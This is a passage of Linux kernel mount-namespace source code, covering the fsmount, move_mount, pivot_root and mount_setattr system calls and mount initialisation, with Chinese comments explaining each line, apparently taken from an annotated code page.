&amp; MOUNT_ATTR_RDONLY) mnt_flags |= MNT_READONLY; // 如果attr_flags中包含MOUNT_ATTR_RDONLY标志位，则将MNT_READONLY标志位加入mnt_flags if (attr_flags &amp; MOUNT_ATTR_NOSUID) mnt_flags |= MNT_NOSUID; // 如果attr_flags中包含MOUNT_ATTR_NOSUID标志位，则将MNT_NOSUID标志位加入mnt_flags if (attr_flags &amp; MOUNT_ATTR_NODEV) mnt_flags |= MNT_NODEV; // 如果attr_flags中包含MOUNT_ATTR_NODEV标志位，则将MNT_NODEV标志位加入mnt_flags if (attr_flags &amp; MOUNT_ATTR_NOEXEC) mnt_flags |= MNT_NOEXEC; // 如果attr_flags中包含MOUNT_ATTR_NOEXEC标志位，则将MNT_NOEXEC标志位加入mnt_flags if (attr_flags &amp; MOUNT_ATTR_NODIRATIME) mnt_flags |= MNT_NODIRATIME; // 如果attr_flags中包含MOUNT_ATTR_NODIRATIME标志位，则将MNT_NODIRATIME标志位加入mnt_flags if (attr_flags &amp; MOUNT_ATTR_NOSYMFOLLOW) mnt_flags |= MNT_NOSYMFOLLOW; // 如果attr_flags中包含MOUNT_ATTR_NOSYMFOLLOW标志位，则将MNT_NOSYMFOLLOW标志位加入mnt_flags return mnt_flags;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119/* * 为一个新的、准备好的超级块（由fs_fd指定）创建一个内核挂载表示，并附加到类似于open_tree的文件描述符。 */SYSCALL_DEFINE3(fsmount, int, fs_fd, unsigned int, flags, unsigned int, attr_flags)&#123; struct mnt_namespace *ns; // 指向mnt_namespace结构体的指针 struct fs_context *fc; // 指向fs_context结构体的指针 struct file *file; // 指向file结构体的指针 struct path newmount; // 指向path结构体的指针 struct mount *mnt; // 指向mount结构体的指针 struct fd f; // fd结构体 unsigned int mnt_flags = 0; // 挂载标志 long ret; // 返回值 if (!may_mount()) // 检查是否有挂载权限 return -EPERM; if ((flags &amp; ~(FSMOUNT_CLOEXEC)) != 0) // 检查flags是否合法 return -EINVAL; if (attr_flags &amp; ~FSMOUNT_VALID_FLAGS) // 检查attr_flags是否合法 return -EINVAL; mnt_flags = attr_flags_to_mnt_flags(attr_flags); // 将attr_flags转换为mnt_flags switch (attr_flags &amp; MOUNT_ATTR__ATIME) &#123; // 根据attr_flags的ATIME位进行判断 case MOUNT_ATTR_STRICTATIME: // 如果是STRICTATIME break; case MOUNT_ATTR_NOATIME: // 如果是NOATIME mnt_flags |= MNT_NOATIME; // 设置mnt_flags的MNT_NOATIME位 break; case MOUNT_ATTR_RELATIME: // 如果是RELATIME mnt_flags |= MNT_RELATIME; // 设置mnt_flags的MNT_RELATIME位 break; default: return -EINVAL; // 其他情况返回错误 &#125; f = fdget(fs_fd); // 获取文件描述符对应的文件 if (!f.file) return -EBADF; // 如果文件不存在，返回错误 ret = -EINVAL; if (f.file-&gt;f_op != &amp;fscontext_fops) // 检查文件操作是否正确 goto err_fsfd; fc = f.file-&gt;private_data; // 获取文件的私有数据 ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex); // 加锁 if (ret &lt; 0) goto err_fsfd; /* 必须有一个有效的超级块才能进行挂载 */ ret = -EINVAL; if (!fc-&gt;root) goto err_unlock; ret = -EPERM; if (mount_too_revealing(fc-&gt;root-&gt;d_sb, &amp;mnt_flags)) &#123; // 检查挂载是否过于暴露 pr_warn(&quot;VFS: Mount too revealing\\n&quot;); goto err_unlock; &#125; ret = -EBUSY; if (fc-&gt;phase != FS_CONTEXT_AWAITING_MOUNT) // 检查挂载阶段是否正确 goto err_unlock; if (fc-&gt;sb_flags &amp; SB_MANDLOCK) // 检查超级块标志是否包含SB_MANDLOCK warn_mandlock(); // 发出警告 newmount.mnt = vfs_create_mount(fc); // 创建挂载点 if (IS_ERR(newmount.mnt)) &#123; ret = PTR_ERR(newmount.mnt); goto err_unlock; &#125; newmount.dentry = dget(fc-&gt;root); // 获取根目录的dentry newmount.mnt-&gt;mnt_flags = mnt_flags; // 设置挂载点的mnt_flags /* 完成挂载操作后，将文件上下文设置为类似于fspick()的状态。 * 此时不希望进行任何内存分配等操作，因为不希望处理任何可能发生的错误。 */ vfs_clean_context(fc); ns = alloc_mnt_ns(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, true); // 分配mnt_namespace结构体 if (IS_ERR(ns)) &#123; ret = PTR_ERR(ns); goto err_path; &#125; mnt = real_mount(newmount.mnt); // 获取实际的mount结构体 mnt-&gt;mnt_ns = ns; // 设置mnt_namespace ns-&gt;root = mnt; ns-&gt;mounts = 1; list_add(&amp;mnt-&gt;mnt_list, &amp;ns-&gt;list); mntget(newmount.mnt); /* 使用O_PATH标志打开一个表面上的文件描述符，并标记需要卸载而不仅仅是释放 */ file = dentry_open(&amp;newmount, O_PATH, fc-&gt;cred); // 打开文件描述符 if (IS_ERR(file)) &#123; dissolve_on_fput(newmount.mnt); ret = PTR_ERR(file); goto err_path; &#125; file-&gt;f_mode |= FMODE_NEED_UNMOUNT; // 设置文件模式的FMODE_NEED_UNMOUNT位 ret = get_unused_fd_flags((flags &amp; FSMOUNT_CLOEXEC) ? O_CLOEXEC : 0); // 获取未使用的文件描述符 if (ret &gt;= 0) fd_install(ret, file); // 安装文件描述符 else fput(file);err_path: path_put(&amp;newmount);err_unlock: mutex_unlock(&amp;fc-&gt;uapi_mutex);err_fsfd: fdput(f); return ret;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657/* * 将一个挂载点从一个位置移动到另一个位置。与fsopen()/fsmount()结合使用，用于安装新的挂载点， * 与open_tree(OPEN_TREE_CLONE [| AT_RECURSIVE])结合使用，可以用于复制挂载子树。 * * 注意，flags值是MOVE_MOUNT_*标志的组合。 */SYSCALL_DEFINE5(move_mount, // 定义名为move_mount的系统调用，接受5个参数 int, from_dfd, const char __user *, from_pathname, // 源文件描述符和路径名 int, to_dfd, const char __user *, to_pathname, // 目标文件描述符和路径名 unsigned int, flags) // 移动挂载点的标志&#123; struct path from_path, to_path; // 定义源路径和目标路径的结构体 unsigned int lflags; // 查找标志 int ret = 0; // 返回值，默认为0 if (!may_mount()) // 检查是否具有挂载权限 return -EPERM; // 没有权限则返回EPERM错误 if (flags &amp; ~MOVE_MOUNT__MASK) // 检查flags是否包含无效的标志位 return -EINVAL; // 包含无效标志位则返回EINVAL错误 /* 如果有人提供了路径名，则不允许从需要卸载的文件描述符移动， * 因为我们无法访问标志以在之后清除它。 */ lflags = 0; // 初始化查找标志 if (flags &amp; MOVE_MOUNT_F_SYMLINKS) lflags |= LOOKUP_FOLLOW; // 如果flags包含MOVE_MOUNT_F_SYMLINKS标志，则设置查找标志为LOOKUP_FOLLOW if (flags &amp; MOVE_MOUNT_F_AUTOMOUNTS) lflags |= LOOKUP_AUTOMOUNT; // 如果flags包含MOVE_MOUNT_F_AUTOMOUNTS标志，则设置查找标志为LOOKUP_AUTOMOUNT if (flags &amp; MOVE_MOUNT_F_EMPTY_PATH) lflags |= LOOKUP_EMPTY; // 如果flags包含MOVE_MOUNT_F_EMPTY_PATH标志，则设置查找标志为LOOKUP_EMPTY ret = user_path_at(from_dfd, from_pathname, lflags, &amp;from_path); // 获取源路径的struct path结构 if (ret &lt; 0) return ret; // 获取失败则返回错误码 lflags = 0; // 初始化查找标志 if (flags &amp; MOVE_MOUNT_T_SYMLINKS) lflags |= LOOKUP_FOLLOW; // 如果flags包含MOVE_MOUNT_T_SYMLINKS标志，则设置查找标志为LOOKUP_FOLLOW if (flags &amp; MOVE_MOUNT_T_AUTOMOUNTS) lflags |= LOOKUP_AUTOMOUNT; // 如果flags包含MOVE_MOUNT_T_AUTOMOUNTS标志，则设置查找标志为LOOKUP_AUTOMOUNT if (flags &amp; MOVE_MOUNT_T_EMPTY_PATH) lflags |= LOOKUP_EMPTY; // 如果flags包含MOVE_MOUNT_T_EMPTY_PATH标志，则设置查找标志为LOOKUP_EMPTY ret = user_path_at(to_dfd, to_pathname, lflags, &amp;to_path); // 获取目标路径的struct path结构 if (ret &lt; 0) goto out_from; // 获取失败则跳转到out_from标签处进行清理操作 ret = security_move_mount(&amp;from_path, &amp;to_path); // 进行安全检查 if (ret &lt; 0) goto out_to; // 安全检查失败则跳转到out_to标签处进行清理操作 if (flags &amp; MOVE_MOUNT_SET_GROUP) ret = do_set_group(&amp;from_path, &amp;to_path); // 如果flags包含MOVE_MOUNT_SET_GROUP标志，则设置源路径和目标路径的组 else ret = do_move_mount(&amp;from_path, &amp;to_path); // 否则进行挂载点的移动操作out_to: path_put(&amp;to_path); // 释放目标路径结构的引用计数out_from: path_put(&amp;from_path); // 释放源路径结构的引用计数 return ret; // 返回操作结果&#125; 123456789101112131415161718192021222324252627/* * 如果路径从根目录可达，则返回true * * namespace_sem或mount_lock被持有 */bool is_path_reachable(struct mount *mnt, struct dentry *dentry, const struct path *root)&#123; while (&amp;mnt-&gt;mnt != root-&gt;mnt &amp;&amp; mnt_has_parent(mnt)) &#123; dentry = mnt-&gt;mnt_mountpoint; // 更新dentry为当前挂载点的dentry mnt = mnt-&gt;mnt_parent; // 更新mnt为当前挂载点的父挂载点 &#125; return &amp;mnt-&gt;mnt == root-&gt;mnt &amp;&amp; is_subdir(dentry, root-&gt;dentry); // 判断是否可达根目录并且是子目录&#125;/* * 判断path1是否在path2下面 */bool path_is_under(const struct path *path1, const struct path *path2)&#123; bool res; read_seqlock_excl(&amp;mount_lock); // 获取mount_lock的读锁 res = is_path_reachable(real_mount(path1-&gt;mnt), path1-&gt;dentry, path2); // 调用is_path_reachable函数判断路径是否可达 read_sequnlock_excl(&amp;mount_lock); // 释放mount_lock的读锁 return res; // 返回判断结果&#125;EXPORT_SYMBOL(path_is_under); // 导出path_is_under函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123/* * pivot_root Semantics: * Moves the root file system of the current process to the directory put_old, * makes new_root as the new root file system of the current process, and sets * root/cwd of all processes which had them on the current root to new_root. * * Restrictions: * The new_root and put_old must be directories, and must not be on the * same file system as the current process root. The put_old must be * underneath new_root, i.e. adding a non-zero number of /.. to the string * pointed to by put_old must yield the same directory as new_root. No other * file system may be mounted on put_old. After all, new_root is a mountpoint. * * Also, the current root cannot be on the &#x27;rootfs&#x27; (initial ramfs) filesystem. * See Documentation/filesystems/ramfs-rootfs-initramfs.rst for alternatives * in this situation. * * Notes: * - we don&#x27;t move root/cwd if they are not at the root (reason: if something * cared enough to change them, it&#x27;s probably wrong to force them elsewhere) * - it&#x27;s okay to pick a root that isn&#x27;t the root of a file system, e.g. * /nfs/my_root where /nfs is the mount point. It must be a mountpoint, * though, so you may need to say mount --bind /nfs/my_root /nfs/my_root * first. */SYSCALL_DEFINE2(pivot_root, const char __user *, new_root, const char __user *, put_old)&#123; struct path new, old, root; struct mount *new_mnt, *root_mnt, *old_mnt, *root_parent, *ex_parent; struct mountpoint *old_mp, *root_mp; int error; if (!may_mount()) return -EPERM; error = user_path_at(AT_FDCWD, new_root, LOOKUP_FOLLOW | LOOKUP_DIRECTORY, &amp;new); if (error) goto out0; error = user_path_at(AT_FDCWD, put_old, LOOKUP_FOLLOW | LOOKUP_DIRECTORY, &amp;old); if (error) goto out1; error = security_sb_pivotroot(&amp;old, &amp;new); if (error) goto out2; get_fs_root(current-&gt;fs, &amp;root); old_mp = lock_mount(&amp;old); error = PTR_ERR(old_mp); if (IS_ERR(old_mp)) goto out3; error = -EINVAL; new_mnt = real_mount(new.mnt); root_mnt = real_mount(root.mnt); old_mnt = real_mount(old.mnt); ex_parent = new_mnt-&gt;mnt_parent; root_parent = root_mnt-&gt;mnt_parent; if (IS_MNT_SHARED(old_mnt) || IS_MNT_SHARED(ex_parent) || IS_MNT_SHARED(root_parent)) goto out4; if (!check_mnt(root_mnt) || !check_mnt(new_mnt)) goto out4; if (new_mnt-&gt;mnt.mnt_flags &amp; MNT_LOCKED) goto out4; error = -ENOENT; if (d_unlinked(new.dentry)) goto out4; error = -EBUSY; if (new_mnt == root_mnt || old_mnt == root_mnt) goto out4; /* loop, on the same file system */ error = -EINVAL; if (root.mnt-&gt;mnt_root != root.dentry) goto out4; /* not a mountpoint */ if (!mnt_has_parent(root_mnt)) goto out4; /* not attached */ if (new.mnt-&gt;mnt_root != new.dentry) goto out4; /* not a mountpoint */ if (!mnt_has_parent(new_mnt)) goto out4; /* not attached */ /* make sure we can reach put_old from new_root */ if (!is_path_reachable(old_mnt, old.dentry, &amp;new)) goto out4; /* make certain new is below the root */ if (!is_path_reachable(new_mnt, new.dentry, &amp;root)) goto out4; lock_mount_hash(); umount_mnt(new_mnt); root_mp = unhash_mnt(root_mnt); /* we&#x27;ll need its mountpoint */ if (root_mnt-&gt;mnt.mnt_flags &amp; MNT_LOCKED) &#123; new_mnt-&gt;mnt.mnt_flags |= MNT_LOCKED; root_mnt-&gt;mnt.mnt_flags &amp;= ~MNT_LOCKED; &#125; /* mount old root on put_old */ attach_mnt(root_mnt, old_mnt, old_mp); /* mount new_root on / */ attach_mnt(new_mnt, root_parent, root_mp); mnt_add_count(root_parent, -1); touch_mnt_namespace(current-&gt;nsproxy-&gt;mnt_ns); /* A moved mount should not expire automatically */ list_del_init(&amp;new_mnt-&gt;mnt_expire); put_mountpoint(root_mp); unlock_mount_hash(); chroot_fs_refs(&amp;root, &amp;new); error = 0;out4: unlock_mount(old_mp); if (!error) mntput_no_expire(ex_parent);out3: path_put(&amp;root);out2: path_put(&amp;old);out1: path_put(&amp;new);out0: return error;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465static unsigned int recalc_flags(struct mount_kattr *kattr, struct mount *mnt)&#123; unsigned int flags = mnt-&gt;mnt.mnt_flags; /* 要清除的标志位 */ flags &amp;= ~kattr-&gt;attr_clr; /* 要设置的标志位 */ flags |= kattr-&gt;attr_set; return flags;&#125;static int can_idmap_mount(const struct mount_kattr *kattr, struct mount *mnt)&#123; struct vfsmount *m = &amp;mnt-&gt;mnt; struct user_namespace *fs_userns = m-&gt;mnt_sb-&gt;s_user_ns; if (!kattr-&gt;mnt_idmap) return 0; /* * 使用文件系统范围的id映射创建id映射的挂载点没有意义，因此阻止该操作。 * 我们不允许模糊的语义。 */ if (!check_fsmapping(kattr-&gt;mnt_idmap, m-&gt;mnt_sb)) return -EINVAL; /* * 一旦挂载点进行了id映射，就不允许更改其映射关系。 * 这样可以简化事情，调用者可以创建另一个绑定挂载点来进行id映射。 */ if (is_idmapped_mnt(m)) return -EPERM; /* 底层文件系统尚不支持id映射的挂载点。 */ if (!(m-&gt;mnt_sb-&gt;s_type-&gt;fs_flags &amp; FS_ALLOW_IDMAP)) return -EINVAL; /* 我们没有控制超级块的权限。 */ if (!ns_capable(fs_userns, CAP_SYS_ADMIN)) return -EPERM; /* 挂载点已经在文件系统层次结构中可见。 */ if (!is_anon_ns(mnt-&gt;mnt_ns)) return -EINVAL; return 0;&#125;/** * mnt_allow_writers() - 检查属性更改是否允许写入操作 * @kattr: 新的挂载属性 * @mnt: 将应用@kattr的挂载点 * * 检查@kattr中的新挂载属性是否允许并发写入操作。 * * 返回值：如果需要保持写入操作，则返回true；否则返回false。 */static inline bool mnt_allow_writers(const struct mount_kattr *kattr, const struct mount *mnt)&#123; return (!(kattr-&gt;attr_set &amp; MNT_READONLY) || (mnt-&gt;mnt.mnt_flags &amp; MNT_READONLY)) &amp;&amp; !kattr-&gt;mnt_idmap;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566static int mount_setattr_prepare(struct mount_kattr *kattr, struct mount *mnt)&#123; struct mount *m; int err; // 遍历挂载点链表 for (m = mnt; m; m = next_mnt(m, mnt)) &#123; // 检查是否可以更改挂载点的标志位 if (!can_change_locked_flags(m, recalc_flags(kattr, m))) &#123; err = -EPERM; break; &#125; // 检查是否可以进行id映射 err = can_idmap_mount(kattr, m); if (err) break; // 检查是否允许写入操作 if (!mnt_allow_writers(kattr, m)) &#123; err = mnt_hold_writers(m); if (err) break; &#125; // 如果不需要递归处理，则直接返回 if (!kattr-&gt;recurse) return 0; &#125; if (err) &#123; struct mount *p; /* * 如果调用了mnt_hold_writers()，则在mnt_flags中设置了MNT_WRITE_HOLD标志位。 * 循环将所有挂载点的MNT_WRITE_HOLD标志位取消，并且需要包括第一个挂载点。 */ for (p = mnt; p; p = next_mnt(p, mnt)) &#123; // 如果之前调用了mnt_hold_writers()，则解除阻塞 if (p-&gt;mnt.mnt_flags &amp; MNT_WRITE_HOLD) mnt_unhold_writers(p); /* * 当第一个被更改的挂载点的MNT_WRITE_HOLD标志位被取消后，循环结束。 */ if (p == m) break; &#125; &#125; return err;&#125;static void do_idmap_mount(const struct mount_kattr *kattr, struct mount *mnt)&#123; // 如果没有设置mnt_idmap，则直接返回 if (!kattr-&gt;mnt_idmap) return; /* * 与mnt_idmap()中的smp_load_acquire()配对使用。 * * 由于我们只允许一个挂载点更改id映射，并且在can_idmap_mount()中进行了验证， * 我们知道该挂载点已经附加了@nop_mnt_idmap。因此，不需要释放任何引用。 */ smp_store_release(&amp;mnt-&gt;mnt.mnt_idmap, mnt_idmap_get(kattr-&gt;mnt_idmap));&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798static void mount_setattr_commit(struct mount_kattr *kattr, struct mount *mnt)&#123; struct mount *m; // 遍历挂载点链表 for (m = mnt; m; m = next_mnt(m, mnt)) &#123; unsigned int flags; // 执行id映射操作 do_idmap_mount(kattr, m); // 重新计算标志位 flags = recalc_flags(kattr, m); // 使用WRITE_ONCE原子操作设置mnt_flags WRITE_ONCE(m-&gt;mnt.mnt_flags, flags); // 如果之前调用了mnt_hold_writers()，则解除阻塞 if (m-&gt;mnt.mnt_flags &amp; MNT_WRITE_HOLD) mnt_unhold_writers(m); // 如果设置了propagation，则更改挂载点的传播属性 if (kattr-&gt;propagation) change_mnt_propagation(m, kattr-&gt;propagation); // 如果不需要递归处理，则跳出循环 if (!kattr-&gt;recurse) break; &#125; // 更新挂载点命名空间的时间戳 touch_mnt_namespace(mnt-&gt;mnt_ns);&#125;static int do_mount_setattr(struct path *path, struct mount_kattr *kattr)&#123; struct mount *mnt = real_mount(path-&gt;mnt); int err = 0; // 如果path的dentry不是mnt的根节点，则返回错误 if (path-&gt;dentry != mnt-&gt;mnt.mnt_root) return -EINVAL; // 如果设置了mnt_userns，则分配mnt_idmap if (kattr-&gt;mnt_userns) &#123; struct mnt_idmap *mnt_idmap; mnt_idmap = alloc_mnt_idmap(kattr-&gt;mnt_userns); if (IS_ERR(mnt_idmap)) return PTR_ERR(mnt_idmap); kattr-&gt;mnt_idmap = mnt_idmap; &#125; // 如果设置了propagation，则获取namespace_lock if (kattr-&gt;propagation) &#123; /* * 只有在实际更改传播属性时才获取namespace_lock。 */ namespace_lock(); if (kattr-&gt;propagation == MS_SHARED) &#123; err = invent_group_ids(mnt, kattr-&gt;recurse); if (err) &#123; namespace_unlock(); return err; &#125; &#125; &#125; err = -EINVAL; lock_mount_hash(); /* 确保这不是纯粹的VFS内部操作。 */ if (!is_mounted(&amp;mnt-&gt;mnt)) goto out; /* * 如果这是一个已附加的挂载点，则确保它位于调用者的挂载命名空间中。 * 如果不是，则不允许调用者与之交互。 * 如果这是一个已分离的挂载点，则确保它附加了一个匿名挂载命名空间，即通过OPEN_TREE_CLONE创建。 */ if (!(mnt_has_parent(mnt) ? check_mnt(mnt) : is_anon_ns(mnt-&gt;mnt_ns))) goto out; /* * 首先，我们将挂载树调整为可以无故障更改挂载属性的状态。 * 如果成功，则提交所有更改；如果失败，则进行清理。 */ err = mount_setattr_prepare(kattr, mnt); if (!err) mount_setattr_commit(kattr, mnt);out: unlock_mount_hash(); if (kattr-&gt;propagation) &#123; if (err) cleanup_group_ids(mnt, NULL); namespace_unlock(); &#125; return err;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465static int build_mount_idmapped(const struct mount_attr *attr, size_t usize,struct mount_kattr *kattr, unsigned int flags)&#123; int err = 0; struct ns_common *ns; struct user_namespace *mnt_userns; struct file *file; // 如果attr中没有设置MOUNT_ATTR_IDMAP，则直接返回 if (!((attr-&gt;attr_set | attr-&gt;attr_clr) &amp; MOUNT_ATTR_IDMAP)) return 0; /* * 目前我们不支持清除id映射的挂载点。如果有这样的需求，我们可以重新考虑， * 但目前让我们保持简单，不允许清除id映射。 */ if (attr-&gt;attr_clr &amp; MOUNT_ATTR_IDMAP) return -EINVAL; // 如果userns_fd超过INT_MAX，则返回错误 if (attr-&gt;userns_fd &gt; INT_MAX) return -EINVAL; file = fget(attr-&gt;userns_fd); if (!file) return -EBADF; // 检查文件是否为proc文件系统的命名空间文件 if (!proc_ns_file(file)) &#123; err = -EINVAL; goto out_fput; &#125; // 获取文件对应的命名空间 ns = get_proc_ns(file_inode(file)); if (ns-&gt;ops-&gt;type != CLONE_NEWUSER) &#123; err = -EINVAL; goto out_fput; &#125; /* * 初始id映射不能用于创建id映射的挂载点。 * 我们使用初始id映射作为非id映射挂载点的指示器。 * 它可以作为一个方便的快捷方式传递给了解id映射挂载点的辅助函数。 * 用户可以创建一个专用的身份映射来实现相同的结果。 */ mnt_userns = container_of(ns, struct user_namespace, ns); if (mnt_userns == &amp;init_user_ns) &#123; err = -EPERM; goto out_fput; &#125; /* 我们不控制目标命名空间。 */ if (!ns_capable(mnt_userns, CAP_SYS_ADMIN)) &#123; err = -EPERM; goto out_fput; &#125; // 获取mnt_userns的引用 kattr-&gt;mnt_userns = get_user_ns(mnt_userns);out_fput: fput(file); return err;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384static int build_mount_kattr(const struct mount_attr *attr, size_t usize, struct mount_kattr *kattr, unsigned int flags)&#123; // 设置lookup_flags，默认为LOOKUP_AUTOMOUNT | LOOKUP_FOLLOW unsigned int lookup_flags = LOOKUP_AUTOMOUNT | LOOKUP_FOLLOW; // 根据flags的值修改lookup_flags if (flags &amp; AT_NO_AUTOMOUNT) lookup_flags &amp;= ~LOOKUP_AUTOMOUNT; if (flags &amp; AT_SYMLINK_NOFOLLOW) lookup_flags &amp;= ~LOOKUP_FOLLOW; if (flags &amp; AT_EMPTY_PATH) lookup_flags |= LOOKUP_EMPTY; // 将lookup_flags赋值给kattr的lookup_flags成员 *kattr = (struct mount_kattr) &#123; .lookup_flags = lookup_flags, .recurse = !!(flags &amp; AT_RECURSIVE), &#125;; // 检查attr的propagation字段是否合法 if (attr-&gt;propagation &amp; ~MOUNT_SETATTR_PROPAGATION_FLAGS) return -EINVAL; // 检查attr的propagation字段是否只有一个标志位被设置 if (hweight32(attr-&gt;propagation &amp; MOUNT_SETATTR_PROPAGATION_FLAGS) &gt; 1) return -EINVAL; // 将attr的propagation字段赋值给kattr的propagation成员 kattr-&gt;propagation = attr-&gt;propagation; // 检查attr的attr_set和attr_clr字段是否合法 if ((attr-&gt;attr_set | attr-&gt;attr_clr) &amp; ~MOUNT_SETATTR_VALID_FLAGS) return -EINVAL; // 将attr的attr_set字段转换为mnt_flags，并赋值给kattr的attr_set成员 kattr-&gt;attr_set = attr_flags_to_mnt_flags(attr-&gt;attr_set); // 将attr的attr_clr字段转换为mnt_flags，并赋值给kattr的attr_clr成员 kattr-&gt;attr_clr = attr_flags_to_mnt_flags(attr-&gt;attr_clr); /* * 由于MOUNT_ATTR_&lt;atime&gt;的值是一个枚举类型，而不是位图， * 所以想要切换到不同的atime设置的用户不能仅在attr_set中指定atime设置， * 还必须在attr_clr字段中指定MOUNT_ATTR__ATIME。 * 因此，确保MOUNT_ATTR__ATIME不能在attr_clr中部分设置， * 并且如果attr_clr中没有设置MOUNT_ATTR__ATIME，则attr_set中不能设置任何atime位。 */ if (attr-&gt;attr_clr &amp; MOUNT_ATTR__ATIME) &#123; if ((attr-&gt;attr_clr &amp; MOUNT_ATTR__ATIME) != MOUNT_ATTR__ATIME) return -EINVAL; /* * 清除所有先前的时间设置，因为它们是互斥的。 */ kattr-&gt;attr_clr |= MNT_RELATIME | MNT_NOATIME; switch (attr-&gt;attr_set &amp; MOUNT_ATTR__ATIME) &#123; case MOUNT_ATTR_RELATIME: kattr-&gt;attr_set |= MNT_RELATIME; break; case MOUNT_ATTR_NOATIME: kattr-&gt;attr_set |= MNT_NOATIME; break; case MOUNT_ATTR_STRICTATIME: break; default: return -EINVAL; &#125; &#125; else &#123; if (attr-&gt;attr_set &amp; MOUNT_ATTR__ATIME) return -EINVAL; &#125; // 调用build_mount_idmapped函数进行进一步处理 return build_mount_idmapped(attr, usize, kattr, flags);&#125;static void finish_mount_kattr(struct mount_kattr *kattr)&#123; // 释放kattr的mnt_userns成员 put_user_ns(kattr-&gt;mnt_userns); kattr-&gt;mnt_userns = NULL; // 释放kattr的mnt_idmap成员 if (kattr-&gt;mnt_idmap) mnt_idmap_put(kattr-&gt;mnt_idmap);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657SYSCALL_DEFINE5(mount_setattr, int, dfd, const char __user *, path, unsigned int, flags, struct mount_attr __user *, uattr, size_t, usize)&#123; int err; struct path target; struct mount_attr attr; struct mount_kattr kattr; // 检查struct mount_attr的大小是否正确 BUILD_BUG_ON(sizeof(struct mount_attr) != MOUNT_ATTR_SIZE_VER0); // 检查flags是否包含非法标志位 if (flags &amp; ~(AT_EMPTY_PATH | AT_RECURSIVE | AT_SYMLINK_NOFOLLOW | AT_NO_AUTOMOUNT)) return -EINVAL; // 检查usize是否超过页大小 if (unlikely(usize &gt; PAGE_SIZE)) return -E2BIG; // 检查usize是否小于MOUNT_ATTR_SIZE_VER0 if (unlikely(usize &lt; MOUNT_ATTR_SIZE_VER0)) return -EINVAL; // 检查是否有权限进行挂载操作 if (!may_mount()) return -EPERM; // 从用户空间复制struct mount_attr到内核空间的attr变量 err = copy_struct_from_user(&amp;attr, sizeof(attr), uattr, usize); if (err) return err; /* 如果attr的attr_set、attr_clr和propagation字段都为0，则不需要遍历挂载点。 */ if (attr.attr_set == 0 &amp;&amp; attr.attr_clr == 0 &amp;&amp; attr.propagation == 0) return 0; // 构建mount_kattr结构体 err = build_mount_kattr(&amp;attr, usize, &amp;kattr, flags); if (err) return err; // 获取目标路径的struct path err = user_path_at(dfd, path, kattr.lookup_flags, &amp;target); if (!err) &#123; // 执行挂载属性设置操作 err = do_mount_setattr(&amp;target, &amp;kattr); path_put(&amp;target); &#125; // 完成mount_kattr结构体的处理 finish_mount_kattr(&amp;kattr); return err;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778static void __init init_mount_tree(void)&#123; struct vfsmount *mnt; struct mount *m; struct mnt_namespace *ns; struct path root; // 使用rootfs_fs_type挂载根文件系统 mnt = vfs_kern_mount(&amp;rootfs_fs_type, 0, &quot;rootfs&quot;, NULL); if (IS_ERR(mnt)) panic(&quot;Can&#x27;t create rootfs&quot;); // 分配初始命名空间 ns = alloc_mnt_ns(&amp;init_user_ns, false); if (IS_ERR(ns)) panic(&quot;Can&#x27;t allocate initial namespace&quot;); m = real_mount(mnt); m-&gt;mnt_ns = ns; ns-&gt;root = m; ns-&gt;mounts = 1; list_add(&amp;m-&gt;mnt_list, &amp;ns-&gt;list); init_task.nsproxy-&gt;mnt_ns = ns; get_mnt_ns(ns); root.mnt = mnt; root.dentry = mnt-&gt;mnt_root; mnt-&gt;mnt_flags |= MNT_LOCKED; // 设置当前进程的文件系统根目录和当前工作目录 set_fs_pwd(current-&gt;fs, &amp;root); set_fs_root(current-&gt;fs, &amp;root);&#125;void __init mnt_init(void)&#123; int err; // 创建mnt_cache内存缓存 mnt_cache = kmem_cache_create(&quot;mnt_cache&quot;, sizeof(struct mount), 0, SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL); // 分配mount_hashtable和mountpoint_hashtable哈希表 mount_hashtable = alloc_large_system_hash(&quot;Mount-cache&quot;, sizeof(struct hlist_head), mhash_entries, 19, HASH_ZERO, &amp;m_hash_shift, &amp;m_hash_mask, 0, 0); mountpoint_hashtable = alloc_large_system_hash(&quot;Mountpoint-cache&quot;, sizeof(struct hlist_head), mphash_entries, 19, HASH_ZERO, &amp;mp_hash_shift, &amp;mp_hash_mask, 0, 0); // 检查是否成功分配哈希表 if (!mount_hashtable || !mountpoint_hashtable) panic(&quot;Failed to allocate mount hash table\\n&quot;); // 初始化kernfs文件系统 kernfs_init(); // 初始化sysfs文件系统 err = sysfs_init(); if (err) printk(KERN_WARNING &quot;%s: sysfs_init error: %d\\n&quot;, __func__, err); fs_kobj = kobject_create_and_add(&quot;fs&quot;, NULL); if (!fs_kobj) printk(KERN_WARNING &quot;%s: kobj create error\\n&quot;, __func__); // 初始化shmem文件系统 shmem_init(); // 初始化rootfs init_rootfs(); // 初始化挂载树 init_mount_tree();&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465void put_mnt_ns(struct mnt_namespace *ns)&#123; // 如果引用计数不为0，则减少引用计数并返回 if (!refcount_dec_and_test(&amp;ns-&gt;ns.count)) return; // 释放挂载点和命名空间 drop_collected_mounts(&amp;ns-&gt;root-&gt;mnt); free_mnt_ns(ns);&#125;// 挂载文件系统struct vfsmount *kern_mount(struct file_system_type *type)&#123; struct vfsmount *mnt; // 调用vfs_kern_mount函数挂载文件系统 mnt = vfs_kern_mount(type, SB_KERNMOUNT, type-&gt;name, NULL); 